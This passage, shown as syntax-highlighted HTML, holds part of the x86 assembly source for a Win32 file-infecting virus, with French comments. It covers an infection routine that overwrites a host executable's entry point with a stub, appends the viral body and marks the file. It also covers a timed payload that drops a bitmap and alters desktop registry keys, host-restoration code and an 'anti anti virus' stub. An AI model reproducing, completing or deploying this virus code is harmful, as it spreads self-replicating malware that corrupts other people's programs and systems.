    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AENTRYPOINT</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EDX = valeur de l'entrypoint en RVA</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; l'image base en ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AENTRYPOINT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; on l'ajoute ‡ l'ancien EntryPoint</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">return</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; idem pour le point d'entrÈe du virus</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;sauve le code qu'on va Ècraser</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; esi pointe le MZ header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; esi pointe le dÈbut du code de l'hÙte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TAILLE_EPO</span><span class="sc0">         </span><span class="sc1">; la taille du code ‡ injecter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; sauve pointeur du MZ Header </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">savebytes</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; le buffer de destination</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copie le code de l'hÙte</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; restaure pointeur du MZ Header</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;copie le code faÁon epo du virus dans l'hÙte</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">epo</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; esi pointe code ‡ injecter</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; edi pointe l'entrypoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TAILLE_EPO</span><span class="sc0">         </span><span class="sc1">; taille du code ‡ injecter</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copie ce code</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">');'</span><span class="sc0">    </span><span class="sc1">; marque d'infection</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; endroit o˘ copier le virus en virtual</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointeur sur le code ‡ copier</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">       </span><span class="sc1">; Nb de bytes ‡ copier</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; On copie le code viral</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASetFilePointer</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Pointeur au dÈbut du fichier</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">byteread</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AWriteFile</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;ecrit les modifications</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">impossible</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">impossible</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Retire le SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">             </span><span class="sc1">; rÈajuste la pile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc1">; Fermeture du fichier</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ALocalFree</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Liberation de la memoire</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SehError</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; restaure esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Retire le SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">             </span><span class="sc1">; rÈajuste la pile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getebp</span><span class="sc0">              </span><span class="sc1">; restaure ebp</span><span class="sc0">
</span><span class="sc5">getebp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getebp</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectMe</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   Payload PROC</span><span class="sc0">
</span><span class="sc1">;   Change the wallpaper if time is 10h00</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EAX pointe la structure systemtime</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetLocalTime</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; recupËre les infos relatives au temps</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">+</span><span class="sc5">wHour</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">   </span><span class="sc1">; il est 10 heures ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pasdepayload</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">+</span><span class="sc5">wMinute</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; il est 10 h 00 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pasdepayload</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ICI LE PAYLOAD</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lebitmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACreateFileA</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fichier crÈe ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">pasdepayload</span><span class="sc0">            </span><span class="sc1">; non on quitte</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Sauve le handle du fichier crÈe</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bitmap_start</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">byteread</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AWriteFile</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">TAILLE_BMP</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Ècrit l'image</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; erreur de copie ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">pasdepayload</span><span class="sc0">            </span><span class="sc1">; oui on quitte</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc1">; Fermeture du fichier</span><span class="sc0">

</span><span class="sc1">;Ici on a copiÈ le fichier, maintenant on modifie la base de registre.</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Ouvre la clÈ Control Panel\Desktop</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keydesktop</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegOpenKeyExA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KEY_SET_VALUE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;type = centrÈ:</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keytilevalue</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keytile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegSetValueExA</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;WallpaperStyle = 0:</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keytilevalue</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keystyle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegSetValueExA</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;Wallpaper = c:\neo.bmp</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lebitmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyfile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegSetValueExA</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">

</span><span class="sc1">;met le fond d'Ècran en noir:</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Ouvre la clÈ Control Panel\Colors</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keycolor</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegOpenKeyExA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KEY_SET_VALUE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keynoir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyback</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegSetValueExA</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keyhandle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">pasdepayload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   RestoreHost PROC</span><span class="sc0">
</span><span class="sc1">;   Restore the file in memory in order to run the host</span><span class="sc0">
</span><span class="sc1">;   and save the EntryPoint</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">RestoreHost</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AENTRYPOINT</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Sauve la valeur de l'ancien entrypoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THEENTRYPOINT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; obtenu lors de l'infection prÈcÈdente</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;restaure le code qu'on a ÈcrasÈ        ;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; first generation ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">yarienla</span><span class="sc0">            </span><span class="sc1">; skip (i speak english ;)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">savebytes</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; le buffer de sauvegarde rempli avant</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THEENTRYPOINT</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; edi pointe l'EntryPoint normal de l'hÙte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TAILLE_EPO</span><span class="sc0">         </span><span class="sc1">; la taille du code ‡ injecter</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copie le code de l'hÙte</span><span class="sc0">

</span><span class="sc5">yarienla</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RestoreHost</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;=== Anti Anti Virus Dectection ================================================</span><span class="sc0">

</span><span class="sc5">epo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">epo_start</span><span class="sc0">           </span><span class="sc1">; call pour pouvoir recuperer l'adresse</span><span class="sc0">
</span><span class="sc5">epo_start</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">; qu'on recupere       </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">epo_start</span><span class="sc0">       </span><span class="sc1">; et qu'on adapte a nos besoins</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">return</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; RETOUR A L'HOTE</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; VA du code principal du virus</span><span class="sc0">
</span><span class="sc5">epo_end</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TAILLE_EPO</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">epo_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">epo</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">savebytes</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">TAILLE_EPO</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc1">;datas</span><span class="sc0">

